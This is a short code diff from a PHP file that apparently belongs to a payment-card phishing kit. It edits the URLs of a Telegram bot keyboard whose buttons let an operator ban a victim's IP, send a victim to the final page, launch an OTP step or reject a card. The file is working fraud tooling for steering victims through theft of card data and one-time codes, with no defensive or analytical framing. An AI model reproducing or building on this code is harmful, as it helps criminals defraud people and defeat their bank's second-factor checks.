@@ -51,14 +51,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 $inline_keyboard = array(
     'inline_keyboard' => array(
         array(
-            array('text' => '🚫 BAN IP 🚫', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['ban']),
-            array('text' => '✅ PAGE FINAL ✅', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['success']),
+            array('text' => '🚫 BAN IP 🚫', 'url' => $base_url . "query.php?ip=" . urlencode($ip) . "&" . $stepes['ban']),
+            array('text' => '✅ PAGE FINAL ✅', 'url' => $base_url . "query.php?ip=" . urlencode($ip) . "&" . $stepes['success']),
         ),
         array(
-            array('text' => '📞 LANCER OTP 📞', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['sms']),
+            array('text' => '📞 LANCER OTP 📞', 'url' => $base_url . "query.php?ip=" . urlencode($ip) . "&" . $stepes['sms']),
         ),
         array(
-            array('text' => '❌ REFUSER CARTE ❌', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['payment-err']),
+            array('text' => '❌ REFUSER CARTE ❌', 'url' => $base_url . "query.php?ip=" . urlencode($ip) . "&" . $stepes['payment-err']),
         )
     )
 );
